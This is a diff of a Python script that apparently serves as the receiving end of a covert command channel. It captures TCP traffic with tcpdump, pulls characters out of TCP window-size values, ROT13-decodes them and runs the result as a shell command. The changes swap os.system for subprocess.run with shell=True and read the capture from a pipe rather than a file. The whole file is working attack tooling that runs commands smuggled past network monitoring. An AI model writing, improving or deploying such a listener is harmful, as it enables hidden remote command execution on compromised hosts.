@@ -1,7 +1,7 @@
 import re
 import subprocess
 import argparse
-import codecs, os
+import codecs
 from colorama import Fore
 
 Reset = Fore.RESET
@@ -17,28 +17,26 @@ args = argParser.parse_args()
 interface = args.interface
 packetsCount = args.packetsCount
 port = args.port
-log = open("./captured.txt", "w")
 
-def decode():
-    with open("./captured.txt", "r") as fi:
-        lines = fi.readlines()
-        var = ""
-        s = [""]
-        for line in lines:
-            regex = r"(win)\s([1-9][0-9]{1,3}|10000000)"
-            str = line
-            matches = re.finditer(regex, str, re.MULTILINE)
-            for matchNum, match in enumerate(matches, start=1):
-                for groupNum in range(0, len(match.groups())):
-                    groupNum = groupNum + 1
-                    all = "{group}".format(group=match.group(groupNum))
-                    all_int = re.findall(r'\d+', all)
-                for ints in all_int:
-                    s.append(chr(int(ints)))
-        if s != None:
-            decoded_command = codecs.decode(''.join(s), 'rot13')
-            print(f"{Green}[+] Encoded command: {Cyan}{''.join(s)}{Reset}\n{Green}[+] Decoded command: {Cyan}{decoded_command}{Reset}")
-            os.system(decoded_command)
+def decode(log):
+    lines = log.splitlines()
+    var = ""
+    s = [""]
+    for line in lines:
+        regex = r"(win)\s([1-9][0-9]{1,3}|10000000)"
+        str = line
+        matches = re.finditer(regex, str, re.MULTILINE)
+        for matchNum, match in enumerate(matches, start=1):
+            for groupNum in range(0, len(match.groups())):
+                groupNum = groupNum + 1
+                all = "{group}".format(group=match.group(groupNum))
+                all_int = re.findall(r'\d+', all)
+            for ints in all_int:
+                s.append(chr(int(ints)))
+    if s != None:
+        decoded_command = codecs.decode(''.join(s), 'rot13')
+        print(f"{Green}[+] Encoded command: {Cyan}{''.join(s)}{Reset}\n{Green}[+] Decoded command: {Cyan}{decoded_command}{Reset}")
+        subprocess.run(decoded_command, shell=True)
 
 if interface == None:
     print(Red + "[-] Pleace specify network interface" + Reset)
@@ -48,10 +46,10 @@ elif port == None:
     print(Red + "[-] Pleace specify port to monitor" + Reset)
 else:
     try:
-        cmd = subprocess.run(["tcpdump", "-i", interface, "tcp", "and", "port", port, "-c", packetsCount], stdout=log)
+        cmd = subprocess.run(["tcpdump", "-i", interface, "tcp", "and", "port", port, "-c", packetsCount], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         if cmd.returncode == 0:
-            decode()
+            decode(cmd.stdout)
     except KeyboardInterrupt:
-        decode()
+        decode(cmd.stdout)
     else:
         print(cmd.returncode)
